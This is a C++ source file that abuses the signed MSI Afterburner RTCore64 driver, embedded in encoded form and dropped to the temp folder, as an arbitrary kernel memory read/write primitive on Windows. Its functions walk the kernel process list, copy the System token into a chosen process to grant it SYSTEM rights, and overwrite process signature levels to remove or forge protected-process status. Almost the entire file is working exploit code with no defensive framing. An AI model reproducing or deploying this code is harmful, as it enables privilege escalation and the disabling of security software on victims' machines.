#include "stdafx.h"
#include "RTCore.h"
//#include <res/RTCore32.sys.res.h>
#include <res/RTCore64.sys.res.h>

namespace device {
 // Micro-Star MSI Afterburner driver arbitrary read and write primitive
 // These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.
 static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
 static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
 static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
 struct Offsets {
  DWORD64 UniqueProcessIdOffset;
  DWORD64 ActiveProcessLinksOffset;
  DWORD64 TokenOffset;
  DWORD64 SignatureLevelOffset;
 };
 struct RTCORE64_MSR_READ {
  DWORD Register;
  DWORD ValueHigh;
  DWORD ValueLow;
 };
 static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
 struct RTCORE64_MEMORY_READ {
  BYTE Pad0[8];
  DWORD64 Address;
  BYTE Pad1[8];
  DWORD ReadSize;
  DWORD Value;
  BYTE Pad3[16];
 };
 static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
 struct RTCORE64_MEMORY_WRITE {
  BYTE Pad0[8];
  DWORD64 Address;
  BYTE Pad1[8];
  DWORD WriteSize;
  DWORD Value;
  BYTE Pad3[16];
 };
 static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

 static bool GetVersionOffsets(struct Offsets& outOffsets) {
  bool result = true;
  ::memset(&outOffsets, 0x00, sizeof(Offsets));
  DWORD winVer = shared::Win::GetWindowsNTReleaseId();
  switch (winVer) {
  case 1607: {
   outOffsets.UniqueProcessIdOffset = 0x02e8;
   outOffsets.ActiveProcessLinksOffset = 0x02f0;
   outOffsets.TokenOffset = 0x0358;
   outOffsets.SignatureLevelOffset = 0x06c8;
  }break;
  case 1803:
   [[fallthrough]];
  case 1809: {
   outOffsets.UniqueProcessIdOffset = 0x02e0;
   outOffsets.ActiveProcessLinksOffset = 0x02e8;
   outOffsets.TokenOffset = 0x0358;
   outOffsets.SignatureLevelOffset = 0x06c8;
  }break;
  case 1903:
   [[fallthrough]];
  case 1909: {
   outOffsets.UniqueProcessIdOffset = 0x02e8;
   outOffsets.ActiveProcessLinksOffset = 0x02f0;
   outOffsets.TokenOffset = 0x0360;
   outOffsets.SignatureLevelOffset = 0x06f8;
  }break;
  case 2004:
   [[fallthrough]];
  case 2009: {
   outOffsets.UniqueProcessIdOffset = 0x0440;
   outOffsets.ActiveProcessLinksOffset = 0x0448;
   outOffsets.TokenOffset = 0x04b8;
   outOffsets.SignatureLevelOffset = 0x0878;
  }break;
  default: {
   result = false;
  }break;
  }
  return result;
 }

 static Offsets gs_offsets = { 0 };
 static DWORD64 gs_PsInitialSystemProcessOffset = 0;
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 RTCore::RTCore() : IDevice(EnDeviceType::MicroStarRTCore64) {
  Init();
 }
 RTCore::~RTCore() {
  UnInit();
 }
 void RTCore::Release() const {
  delete this;
 }
 void RTCore::Init() {
  void(GetVersionOffsets(gs_offsets));
  gs_PsInitialSystemProcessOffset = GetSymbolOffset("PsInitialSystemProcess");
  m_DeviceDosName = LR"(\\.\RTCore64)";
  m_ServiceName = LR"(DeviceServiceRTCore)";
  m_ServiceDisplayName = LR"(DeviceServiceDisplayRTCore)";
  m_FileReleasePathname = shared::Win::GetTempPathW() + m_ServiceName + LR"(.sys)";
  m_FileBuffer = shared::Win::Encryption::WemadeDecode(std::string((char*)&RTCore64_sys_res[0], sizeof(RTCore64_sys_res)));
  do {
   if (shared::Win::AccessW(m_FileReleasePathname)) {
    if (::_wremove(m_FileReleasePathname.c_str()) != 0)
     break;
   }
   void(shared::Win::File::Write(shared::IConv::WStringToMBytes(m_FileReleasePathname), m_FileBuffer));
  } while (0);
 }
 void RTCore::UnInit() {

 }
 bool RTCore::MakeSystemProcess(const DWORD& ProcessId) const {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (ProcessId <= 4)
    break;
   if (!Verify())
    break;
   DWORD dwIntegrityLevel = 0;
   if (!shared::Win::Process::GetProcessIntegrityLevel(ProcessId, dwIntegrityLevel))
    break;
   if (SECURITY_MANDATORY_SYSTEM_RID == dwIntegrityLevel) {
    result = true;
    break;
   }
   ULONG_PTR CurrentProcessAddress = 0;
   if (!GetProcessAddress(ProcessId, CurrentProcessAddress))
    break;
   // Get token value of System process
   //const DWORD64 SystemProcessToken = ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.TokenOffset) & ~15;
   DWORD64 SystemProcessToken = 0;
   if (!GetTokenValueOfSystemProcess(SystemProcessToken))
    break;
   // Reading current process token
   DWORD64 CurrentProcessFastToken = 0;
   if (!ReadMemoryDWORD64(CurrentProcessAddress + gs_offsets.TokenOffset, CurrentProcessFastToken))
    break;
   const DWORD64 CurrentProcessTokenReferenceCounter = CurrentProcessFastToken & 15;
   const DWORD64 CurrentProcessToken = CurrentProcessFastToken & ~15;
   // Stealing System process token
   if (!WriteMemoryDWORD64(CurrentProcessAddress + gs_offsets.TokenOffset, CurrentProcessTokenReferenceCounter | SystemProcessToken))
    break;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::ProcessProtectionAction(const DWORD& ProcessId, const bool& enable, const DWORD& ProcessProtectionLevel /*= 0*/) {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };

  do {//!@ enable

   ULONG_PTR address = 0;
   if (!GetProcessSignatureLevelAddress(ProcessId, address))
    break;

   do {//!@ disable
    if (enable)
     break;
#if 0//!@ Backup
    DWORD dwProcessProtectionLevelsSignatureLevelValue = 0;
    if (!ReadMemoryDWORD(address, dwProcessProtectionLevelsSignatureLevelValue))
     break;
    auto processid_exists = m_ProcessProtectionActionCaches.find(ProcessId);
    if (processid_exists != m_ProcessProtectionActionCaches.end())
     m_ProcessProtectionActionCaches.erase(processid_exists);
    m_ProcessProtectionActionCaches.emplace(ProcessId, dwProcessProtectionLevelsSignatureLevelValue);
#endif
    if (!WriteMemory(address, sizeof(DWORD), 0x00))
     break;
    result = true;
   } while (0);

   do {//!@ enable
    if (!enable)
     break;
    auto find_supported = map_process_protection_levels__signature_level_value.find(ProcessProtectionLevel);
    if (find_supported == map_process_protection_levels__signature_level_value.end())
     break;
#if 0//!@ Use backup.
    DWORD dwEnableProcessProtectionLevel = ProcessProtectionLevel;
    if (dwEnableProcessProtectionLevel <= 0) {
     auto found = m_ProcessProtectionActionCaches.find(ProcessId);
     if (found != m_ProcessProtectionActionCaches.end()) {
      dwEnableProcessProtectionLevel = found->second;
     }
     else {
      break;
     }
    }
#endif
    if (!WriteMemory(address, sizeof(DWORD), find_supported->second))
     break;
    result = true;
   } while (0);

#if 0
   DWORD dwReadValue = 0;
   if (!ReadMemoryDWORD(address, dwReadValue))
    break;

   if (dwReadValue <= 0)
    break;
   std::wstring level;
   shared::Win::Process::GetProcessProtectionLevel(ProcessId, level);
   std::cout << \
    std::format("Pid({}) ProtectionLevelString({}) and SignatureLevelValue(0x{:08X})", \
     ProcessId, shared::IConv::WStringToMBytes(level), dwReadValue) << std::endl;
   //3213111
   // Patches 5 values  SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
   //WriteMemory(address, 4, 3213111);
   auto ssss = 0;
   result = true;
#endif
  } while (0);
  return result;
 }
 bool RTCore::GetProcessAddress(const DWORD& dwProcessId, ULONG_PTR& out_found_address) const {
  bool result = false;
  out_found_address = 0;
  do {
   if (gs_PsInitialSystemProcessOffset == 0)
    break;
   if (gs_offsets.ActiveProcessLinksOffset == 0 || gs_offsets.SignatureLevelOffset == 0 || gs_offsets.TokenOffset == 0 || gs_offsets.UniqueProcessIdOffset == 0)
    break;
   DWORD64 PsInitialSystemProcessAddress = 0;
   if (!ReadMemoryDWORD64(m_KernelBaseAddress + gs_PsInitialSystemProcessOffset, PsInitialSystemProcessAddress))
    break;
   bool found = false;
   DWORD64 ProcessHead = PsInitialSystemProcessAddress + gs_offsets.ActiveProcessLinksOffset;
   DWORD64 CurrentProcessAddress = ProcessHead;
   do {
    const DWORD64 ProcessAddress = CurrentProcessAddress - gs_offsets.ActiveProcessLinksOffset;
    DWORD64 UniqueProcessId = 0;
    if (!ReadMemoryDWORD64(ProcessAddress + gs_offsets.UniqueProcessIdOffset, UniqueProcessId))
     break;
    if (UniqueProcessId == static_cast<DWORD64>(dwProcessId)) {
     found = true;
     break;
    }
    if (!ReadMemoryDWORD64(ProcessAddress + gs_offsets.ActiveProcessLinksOffset, CurrentProcessAddress))
     break;
   } while (CurrentProcessAddress != ProcessHead);
   if (!found)
    break;
   CurrentProcessAddress -= gs_offsets.ActiveProcessLinksOffset;
   out_found_address = CurrentProcessAddress;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::GetTokenValueOfSystemProcess(DWORD64& SystemProcessToken) const {
  bool result = false;
  SystemProcessToken = 0;
  do {
   DWORD64 PsInitialSystemProcessAddress = 0;
   if (!ReadMemoryDWORD64(m_KernelBaseAddress + gs_PsInitialSystemProcessOffset, PsInitialSystemProcessAddress))
    break;
   if (!ReadMemoryDWORD64(PsInitialSystemProcessAddress + gs_offsets.TokenOffset, SystemProcessToken))
    break;
   SystemProcessToken &= (~15);
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::GetProcessTokenAddress(const DWORD& dwProcessId, ULONG_PTR& out_found_address) const {
  bool result = false;
  out_found_address = 0;
  do {
   ULONG_PTR ProcessAddress = 0;
   if (!GetProcessAddress(dwProcessId, ProcessAddress))
    break;
   out_found_address = ProcessAddress + gs_offsets.TokenOffset;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::GetProcessSignatureLevelAddress(const DWORD& dwProcessId, ULONG_PTR& out_found_address) const {
  bool result = false;
  out_found_address = 0;
  do {
   ULONG_PTR ProcessAddress = 0;
   if (!GetProcessAddress(dwProcessId, ProcessAddress))
    break;
   out_found_address = ProcessAddress + gs_offsets.SignatureLevelOffset;
   result = true;
  } while (0);
  return result;
 }

 bool RTCore::ReadMemory(const ULONG_PTR& address, const DWORD& size, DWORD& read) const {
  bool result = false;
  read = 0;
  do {
   if (!Verify())
    break;
   RTCORE64_MEMORY_READ MemoryRead = { 0 };
   MemoryRead.Address = address;
   MemoryRead.ReadSize = size;
   DWORD BytesReturned = 0;
   if (FALSE == ::DeviceIoControl(m_hDevice,
    RTCORE64_MEMORY_READ_CODE,
    &MemoryRead,
    sizeof(MemoryRead),
    &MemoryRead,
    sizeof(MemoryRead),
    &BytesReturned,
    nullptr))
    break;
   read = MemoryRead.Value;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::WriteMemory(const ULONG_PTR& address, const DWORD& size, const DWORD& value) const {
  bool result = false;
  do {
   if (!Verify())
    break;
   RTCORE64_MEMORY_WRITE MemoryWrite = { 0 };
   MemoryWrite.Address = address;
   MemoryWrite.WriteSize = size;
   MemoryWrite.Value = value;
   DWORD BytesReturned = 0;
   if (FALSE == ::DeviceIoControl(m_hDevice,
    RTCORE64_MEMORY_WRITE_CODE,
    &MemoryWrite,
    sizeof(MemoryWrite),
    &MemoryWrite,
    sizeof(MemoryWrite),
    &BytesReturned,
    nullptr))
    break;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::ReadMemoryDWORD64(const ULONG_PTR& address, DWORD64& read) const {
  bool result = false;
  read = 0;
  do {
   DWORD lowPart = 0;
   DWORD highPart = 0;
   if (!ReadMemoryDWORD(address, lowPart))
    break;
   if (!ReadMemoryDWORD(address + sizeof(DWORD), highPart))
    break;
   read = highPart;
   read <<= (sizeof(DWORD) * 8);
   read |= lowPart;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::WriteMemoryDWORD64(const ULONG_PTR& address, const DWORD64& value) const {
  bool result = false;
  do {
   if (!WriteMemory(address, sizeof(DWORD), value & 0xFFFFFFFF))
    break;
   if (!WriteMemory(address + sizeof(DWORD), sizeof(DWORD), value >> (sizeof(DWORD) * 8)))
    break;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::ReadMemoryDWORD(const ULONG_PTR& address, DWORD& read) const {
  bool result = false;
  read = 0;
  do {
   if (!ReadMemory(address, sizeof(DWORD), read))
    break;
   result = true;
  } while (0);
  return result;
 }
 bool RTCore::WriteMemoryDWORD(const ULONG_PTR& address, const DWORD& value) const {
  return 	WriteMemory(address, sizeof(DWORD), value);;
 }
 bool RTCore::WriteMemoryWORD(const ULONG_PTR& address, const WORD& value) const {
  return WriteMemory(address, sizeof(WORD), value);;
 }
 bool RTCore::ReadMemoryWORD(const ULONG_PTR& address, WORD& read) const {
  bool result = false;
  read = 0;
  do {
   DWORD read_tmp = 0;
   if (!ReadMemory(address, sizeof(WORD), read_tmp))
    break;
   read = (read_tmp & 0xFFFF);
   /*read = static_cast<WORD>(read_tmp);*/
  } while (0);
  return result;
 }

}///namespace device